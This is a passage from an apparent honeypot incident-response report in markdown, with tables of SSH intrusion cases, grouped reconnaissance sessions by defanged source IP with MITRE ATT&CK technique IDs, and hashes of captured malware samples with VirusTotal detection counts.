| IR-b3c11555f273 | HIGH | `46.188.119[.]26` | 2026-10-21 06:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-49d03497aec3 | HIGH | `46.188.119[.]26` | 2026-10-21 06:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e984f4c700d6 | HIGH | `157.66.47[.]161` | 2026-10-21 06:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c1334449fc40 | HIGH | `157.66.47[.]161` | 2026-10-21 06:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-46d2e586957c | HIGH | `103.200.25[.]79` | 2026-10-21 06:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b6cff892e5e2 | HIGH | `103.200.25[.]79` | 2026-10-21 06:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e98b97da7653 | HIGH | `109.122.195[.]150` | 2026-10-21 06:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-481dc012e9af | HIGH | `109.122.195[.]150` | 2026-10-21 06:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-02b7e0fe92a6 | HIGH | `164.90.142[.]33` | 2026-10-21 06:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c6334d275a59 | HIGH | `164.90.142[.]33` | 2026-10-21 06:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-83852c30cf59 | HIGH | `34.22.220[.]217` | 2026-10-21 07:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de95d586d72a | HIGH | `125.215.52[.]45` | 2026-10-21 07:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9d0e62637900 | HIGH | `125.215.52[.]45` | 2026-10-21 07:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-338c0969d0c5 | HIGH | `58.186.20[.]143` | 2026-10-21 07:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-92cf785c5cda | HIGH | `58.186.20[.]143` | 2026-10-21 07:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-09afd536747a | HIGH | `125.91.33[.]72` | 2026-10-21 07:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-52ed48cd73c7 | HIGH | `125.91.33[.]72` | 2026-10-21 07:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8c2b877ecceb | HIGH | `120.48.148[.]35` | 2026-10-21 07:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-97cf4a84a598 | HIGH | `120.48.148[.]35` | 2026-10-21 07:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6cb882b0646b | HIGH | `50.6.5[.]14` | 2026-10-21 08:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b60fb8f6ff10 | HIGH | `50.6.5[.]14` | 2026-10-21 08:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4ffc6d20afbe | HIGH | `189.204.230[.]91` | 2026-10-21 08:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3f7fe3ec2e5f | HIGH | `189.204.230[.]91` | 2026-10-21 08:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-342c15a99cd8 | HIGH | `168.107.68[.]47` | 2026-10-21 08:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-722754162235 | HIGH | `168.107.68[.]47` | 2026-10-21 08:13 | Y | 7 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a6d508ee8005 | HIGH | `2.57.122[.]209` | 2026-10-21 08:50 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-da28008d8263 | HIGH | `77.90.185[.]17` | 2026-10-21 08:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d112782bb9c4 | HIGH | `176.53.159[.]196` | 2026-10-21 09:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-751376ce2e79 | HIGH | `176.53.159[.]196` | 2026-10-21 10:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2473ae01733a | HIGH | `94.154.43[.]53` | 2026-10-21 10:51 | Y | 0 | 0 | `T1078` |
| IR-fa291f6e35ec | HIGH | `185.206.32[.]100` | 2026-10-21 10:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-44bd73c97928 | HIGH | `185.206.32[.]100` | 2026-10-21 10:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-75ee6a6bc9e5 | HIGH | `135.106.197[.]8` | 2026-10-21 10:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5e0e5afb2525 | HIGH | `135.106.197[.]8` | 2026-10-21 10:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c990110ada6a | HIGH | `202.70.78[.]237` | 2026-10-21 11:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-74418d2b4def | HIGH | `202.70.78[.]237` | 2026-10-21 11:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c734cc046ced | HIGH | `203.161.38[.]233` | 2026-10-21 11:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c2c6bb4e944b | HIGH | `203.161.38[.]233` | 2026-10-21 11:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9c7c5ec0a4b6 | HIGH | `108.174.147[.]36` | 2026-10-21 11:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7ff739003d32 | HIGH | `108.174.147[.]36` | 2026-10-21 11:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2151d9c4fc2b | HIGH | `41.204.63[.]118` | 2026-10-21 11:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-42e6a601fbe5 | HIGH | `41.204.63[.]118` | 2026-10-21 11:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1f21fe771288 | HIGH | `31.210.36[.]240` | 2026-10-21 11:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-34ebc00bab74 | HIGH | `31.210.36[.]240` | 2026-10-21 11:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5c3136d6e6d9 | HIGH | `189.244.107[.]78` | 2026-10-21 11:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a0df99364758 | HIGH | `189.244.107[.]78` | 2026-10-21 11:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bd94be328d06 | HIGH | `203.66.168[.]131` | 2026-10-21 11:31 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-d8222b41ae41 | HIGH | `71.6.134[.]231` | 2026-10-21 11:34 | Y | 3 | 0 | `T1078` |
| IR-12ba80981159 | HIGH | `216.36.112[.]159` | 2026-10-21 11:52 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-493ce3830a49 | HIGH | `165.22.98[.]216` | 2026-10-21 11:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-29d049775e6e | HIGH | `77.90.185[.]17` | 2026-10-21 12:00 | Y | 0 | 0 | `T1078 · T1592` |
_… 27 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.5[.]188` | **4** | 2026-10-21 06:26 | 2026-10-21 12:10 | 3m | 0 | `T1592` | 🟢 LOW |
| `112.187.128[.]223` | **2** | 2026-10-21 12:52 | 2026-10-21 14:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-21 12:32 | 2026-10-21 14:26 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-21 01:15 | 2026-10-21 02:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-21 04:15 | 2026-10-21 06:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-21 09:46 | 2026-10-21 10:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-21 12:24 | 2026-10-21 14:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `162.255.112[.]183` | **2** | 2026-10-21 08:33 | 2026-10-21 10:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | **2** | 2026-10-21 03:30 | 2026-10-21 04:03 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]232` | **2** | 2026-10-21 01:25 | 2026-10-21 02:03 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `61.72.67[.]87` | **2** | 2026-10-21 07:30 | 2026-10-21 08:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.201.38[.]226` | 1 | 2026-10-21 05:33 | 2026-10-21 05:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `101.96.195[.]17` | 1 | 2026-10-21 06:41 | 2026-10-21 06:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.197[.]182` | 1 | 2026-10-21 11:27 | 2026-10-21 11:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.184.94[.]160` | 1 | 2026-10-21 12:48 | 2026-10-21 12:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-10-21 08:12 | 2026-10-21 08:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-10-21 10:04 | 2026-10-21 10:04 | 5s | 0 | `T1592` | 🟢 LOW |
| `104.157.47[.]144` | 1 | 2026-10-21 06:04 | 2026-10-21 06:04 | 16s | 0 | `T1592` | 🟢 LOW |
| `105.96.75[.]207` | 1 | 2026-10-21 08:29 | 2026-10-21 08:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `107.150.117[.]187` | 1 | 2026-10-21 04:31 | 2026-10-21 04:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.29.38[.]32` | 1 | 2026-10-21 05:28 | 2026-10-21 05:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.245.48[.]175` | 1 | 2026-10-21 02:52 | 2026-10-21 02:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.72.166[.]13` | 1 | 2026-10-21 03:13 | 2026-10-21 03:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `119.192.187[.]103` | 1 | 2026-10-21 02:02 | 2026-10-21 02:03 | 20s | 0 | `T1592` | 🟢 LOW |
| `119.96.173[.]169` | 1 | 2026-10-21 04:54 | 2026-10-21 04:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.211.138[.]165` | 1 | 2026-10-21 02:10 | 2026-10-21 02:10 | 1s | 0 | `T1592` | 🟢 LOW |
| `120.234.131[.]92` | 1 | 2026-10-21 08:00 | 2026-10-21 08:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.162.14[.]55` | 1 | 2026-10-21 11:54 | 2026-10-21 11:55 | 25s | 0 | `T1592` | 🟢 LOW |
| `121.29.4[.]88` | 1 | 2026-10-21 12:22 | 2026-10-21 12:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-21 04:34 | 2026-10-21 04:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-21 06:35 | 2026-10-21 06:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-21 08:50 | 2026-10-21 08:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-21 14:02 | 2026-10-21 14:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]42` | 1 | 2026-10-21 06:22 | 2026-10-21 06:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-21 03:24 | 2026-10-21 03:25 | 42s | 0 | `T1592` | 🟢 LOW |
| `14.50.1[.]151` | 1 | 2026-10-21 13:15 | 2026-10-21 13:15 | 17s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-21 03:29 | 2026-10-21 03:30 | 41s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-21 13:14 | 2026-10-21 13:15 | 59s | 0 | `T1592` | 🟢 LOW |
| `159.89.49[.]231` | 1 | 2026-10-21 06:04 | 2026-10-21 06:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.120[.]29` | 1 | 2026-10-21 04:40 | 2026-10-21 04:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-10-21 06:53 | 2026-10-21 06:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]34` | 1 | 2026-10-21 05:47 | 2026-10-21 05:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]220` | 1 | 2026-10-21 04:44 | 2026-10-21 04:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.112.105[.]77` | 1 | 2026-10-21 03:28 | 2026-10-21 03:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.62.126[.]66` | 1 | 2026-10-21 02:06 | 2026-10-21 02:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.51.155[.]35` | 1 | 2026-10-21 03:40 | 2026-10-21 03:40 | 12s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-10-21 06:36 | 2026-10-21 06:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.114[.]151` | 1 | 2026-10-21 14:47 | 2026-10-21 14:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-10-21 06:44 | 2026-10-21 06:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]19` | 1 | 2026-10-21 10:59 | 2026-10-21 11:00 | 9s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]246` | 1 | 2026-10-21 05:37 | 2026-10-21 05:37 | 2s | 0 | `T1592` | 🟢 LOW |
| `186.153.69[.]40` | 1 | 2026-10-21 03:35 | 2026-10-21 03:36 | 12s | 0 | `T1592` | 🟢 LOW |
| `189.144.3[.]182` | 1 | 2026-10-21 14:12 | 2026-10-21 14:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.104.39[.]40` | 1 | 2026-10-21 09:47 | 2026-10-21 09:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-21 12:07 | 2026-10-21 12:09 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.8.186[.]29` | 1 | 2026-10-21 01:50 | 2026-10-21 01:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-10-21 08:33 | 2026-10-21 08:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.138.46[.]131` | 1 | 2026-10-21 01:00 | 2026-10-21 01:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `201.221.105[.]43` | 1 | 2026-10-21 07:04 | 2026-10-21 07:05 | 11s | 0 | `T1592` | 🟢 LOW |
| `203.156.216[.]10` | 1 | 2026-10-21 04:39 | 2026-10-21 04:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]7` | 1 | 2026-10-21 02:39 | 2026-10-21 02:39 | 3s | 0 | `T1592` | 🟢 LOW |
| `218.158.227[.]211` | 1 | 2026-10-21 01:05 | 2026-10-21 01:06 | 23s | 0 | `T1592` | 🟢 LOW |
| `220.77.86[.]237` | 1 | 2026-10-21 09:12 | 2026-10-21 09:13 | 23s | 0 | `T1592` | 🟢 LOW |
| `221.124.94[.]188` | 1 | 2026-10-21 02:27 | 2026-10-21 02:27 | 17s | 0 | `T1592` | 🟢 LOW |
| `221.124.94[.]188` | 1 | 2026-10-21 12:36 | 2026-10-21 12:36 | 20s | 0 | `T1592` | 🟢 LOW |
| `221.168.97[.]214` | 1 | 2026-10-21 05:38 | 2026-10-21 05:38 | 28s | 0 | `T1592` | 🟢 LOW |
| `24.46.242[.]125` | 1 | 2026-10-21 02:20 | 2026-10-21 02:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.156.154[.]3` | 1 | 2026-10-21 00:57 | 2026-10-21 00:57 | 18s | 0 | `T1592` | 🟢 LOW |
| `3.86.210[.]219` | 1 | 2026-10-21 01:23 | 2026-10-21 01:23 | 1s | 0 | `T1592` | 🟢 LOW |
| `31.148.20[.]168` | 1 | 2026-10-21 05:23 | 2026-10-21 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.14.70[.]113` | 1 | 2026-10-21 05:21 | 2026-10-21 05:21 | 4s | 0 | `T1592` | 🟢 LOW |
| `34.22.220[.]217` | 1 | 2026-10-21 07:43 | 2026-10-21 07:43 | 7s | 0 | `T1592` | 🟢 LOW |
| `34.22.237[.]231` | 1 | 2026-10-21 04:47 | 2026-10-21 04:47 | 5s | 0 | `T1592` | 🟢 LOW |
| `35.205.180[.]215` | 1 | 2026-10-21 07:43 | 2026-10-21 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.240.59[.]131` | 1 | 2026-10-21 06:11 | 2026-10-21 06:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `36.151.150[.]93` | 1 | 2026-10-21 12:25 | 2026-10-21 12:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.139.170[.]225` | 1 | 2026-10-21 05:55 | 2026-10-21 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.51.41[.]137` | 1 | 2026-10-21 07:42 | 2026-10-21 07:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.51.49[.]166` | 1 | 2026-10-21 14:44 | 2026-10-21 14:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-21 10:09 | 2026-10-21 10:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-21 13:07 | 2026-10-21 13:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-21 04:02 | 2026-10-21 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-10-21 02:47 | 2026-10-21 02:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-21 06:40 | 2026-10-21 06:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.82.78[.]105` | 1 | 2026-10-21 10:55 | 2026-10-21 10:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.151.178[.]14` | 1 | 2026-10-21 04:33 | 2026-10-21 04:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.120.30[.]67` | 1 | 2026-10-21 10:39 | 2026-10-21 10:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-21 10:38 | 2026-10-21 10:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.106.134[.]218` | 1 | 2026-10-21 07:49 | 2026-10-21 07:49 | 4s | 0 | `T1592` | 🟢 LOW |
| `58.220.39[.]200` | 1 | 2026-10-21 14:41 | 2026-10-21 14:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.21.181[.]38` | 1 | 2026-10-21 01:23 | 2026-10-21 01:24 | 20s | 0 | `T1592` | 🟢 LOW |
| `60.171.24[.]134` | 1 | 2026-10-21 01:56 | 2026-10-21 01:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.164.177[.]54` | 1 | 2026-10-21 05:53 | 2026-10-21 05:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.164.177[.]54` | 1 | 2026-10-21 11:40 | 2026-10-21 11:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]222` | 1 | 2026-10-21 06:56 | 2026-10-21 06:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]38` | 1 | 2026-10-21 03:47 | 2026-10-21 03:47 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]218` | 1 | 2026-10-21 10:06 | 2026-10-21 10:06 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]124` | 1 | 2026-10-21 13:33 | 2026-10-21 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.175.213[.]4` | 1 | 2026-10-21 06:42 | 2026-10-21 06:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.205.236[.]194` | 1 | 2026-10-21 04:02 | 2026-10-21 04:02 | 29s | 0 | `T1592` | 🟢 LOW |
| `69.206.185[.]69` | 1 | 2026-10-21 01:56 | 2026-10-21 01:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `71.6.134[.]231` | 1 | 2026-10-21 11:03 | 2026-10-21 11:03 | 14s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]4` | 1 | 2026-10-21 09:36 | 2026-10-21 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-21 06:43 | 2026-10-21 06:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-21 10:10 | 2026-10-21 10:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-10-21 05:50 | 2026-10-21 05:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.112.141[.]108` | 1 | 2026-10-21 02:26 | 2026-10-21 02:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `79.135.225[.]50` | 1 | 2026-10-21 14:32 | 2026-10-21 14:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `8.134.157[.]132` | 1 | 2026-10-21 11:22 | 2026-10-21 11:22 | 30s | 0 | `T1592` | 🟢 LOW |
| `84.244.58[.]35` | 1 | 2026-10-21 13:34 | 2026-10-21 13:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]16` | 1 | 2026-10-21 08:09 | 2026-10-21 08:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.29.31[.]187` | 1 | 2026-10-21 12:20 | 2026-10-21 12:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.121.13[.]28` | 1 | 2026-10-21 08:39 | 2026-10-21 08:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]202` | 1 | 2026-10-21 04:58 | 2026-10-21 04:58 | 2s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]241` | 1 | 2026-10-21 14:12 | 2026-10-21 14:12 | 1s | 0 | `T1592` | 🟢 LOW |
| `87.251.64[.]124` | 1 | 2026-10-21 01:31 | 2026-10-21 01:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.253.170[.]165` | 1 | 2026-10-21 12:44 | 2026-10-21 12:44 | 15s | 0 | `T1592` | 🟢 LOW |
| `91.225.162[.]33` | 1 | 2026-10-21 01:42 | 2026-10-21 01:42 | 13s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-21 14:36 | 2026-10-21 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]163` | 1 | 2026-10-21 01:38 | 2026-10-21 01:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]163` | 1 | 2026-10-21 10:05 | 2026-10-21 10:06 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]219` | 1 | 2026-10-21 07:48 | 2026-10-21 07:49 | 29s | 0 | `T1592` | 🟢 LOW |
| `95.46.143[.]39` | 1 | 2026-10-21 12:54 | 2026-10-21 12:54 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
